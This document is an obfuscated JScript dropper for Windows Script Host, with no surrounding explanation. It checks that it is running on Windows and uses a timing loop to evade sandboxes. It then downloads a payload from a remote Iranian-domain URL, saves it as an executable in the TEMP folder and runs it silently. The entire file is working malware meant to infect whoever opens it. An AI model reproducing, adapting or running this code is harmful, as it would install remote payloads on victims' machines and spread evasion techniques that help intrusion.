var _N = false;
var _AB = "CreateObject";
var _K0 = function _IS() {return WScript[_AB]("WScript"+".Shell");}(), _B = 11;
var _SR = "MSXML2.XMLHTTP";
var _QY = 2123213;
var _VO = 0;
function _M(_KM){_K0["Run"](_KM, _VO, _VO);};
function _QO(){return _SR + "";};
function _R(_IW, _BJ){_VO = _VO * 1; return _IW - _BJ;};
function _AY(){return _AB;};
/*@cc_on
  @if (@_win32 || @_win64)
    _N = true;
  @end
@*/
if (_N)
{
var _V = "";
function _MR(){return 22;};
var _E = 0; var _TL = 0;
function _UN()
{
var _HY = new this["Date"]();
var _H = _HY["getUTCMilliseconds"]();
WScript["Sleep"](_MR());
var _HY = new this["Date"]();
var _JF = _HY["getUTCMilliseconds"]();
WScript["Sleep"](_MR());
var _HY = new this["Date"]();
var _W = _HY["getUTCMilliseconds"]();
var _E = "_Y";
_E = _R(_JF, _H);
var _TL = "_Y0";
_TL = _R(_W, _JF);
_V = "open";
return _R(_E, _TL);
}
var _L = false;
var _EB = false;
for (var _K = _VO; _K < _MR() * 1; _K++){if (_UN() != _VO){
_L = true; 
_TL = "31" + 11 * _E + _TL; 
_EB = true; 
break;
}}
function _S() {return ((_L == true) && (_L == _EB)) ? 1 : _VO;};
if (_L && _S() && _EB){
function _BV() {return _K0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "3WCqvPdZkVz.ex" + "e";};
 _NV = _QO();
 _DY = WScript[_AB](_NV);
 var _D = 1;
 while (_D){
try {
	if (_D == 1)
	{
		_DY[_V]("GET", "http://topcarshop.ir/m1kas", false);
		_DY["send"]();
		_U = "Sleep";
	}
	WScript[_U](_MR() + 120); 
	if (_DY["readystate"] < 2 * 2) continue;
	_D = _VO;
	function _UE(_R0) {var _T = (1, 2, 3, 4, 5, _R0); return _T;};
	_HX = WScript[_AY()]("ADODB.Stream");
	_NV = _HX;
	_NV[_V]();
	_NV["type"] = _UE(1);
	_NV["write"](_DY["ResponseBody"]);
	_HX["position"] = _UE(_VO);
	_NV["Save" + "ToFile"](_BV(), 2);
	_HX["cl"+"ose"]();
	_A = _BV();
	_M(_A);
} catch(_D0){};
}
}
}

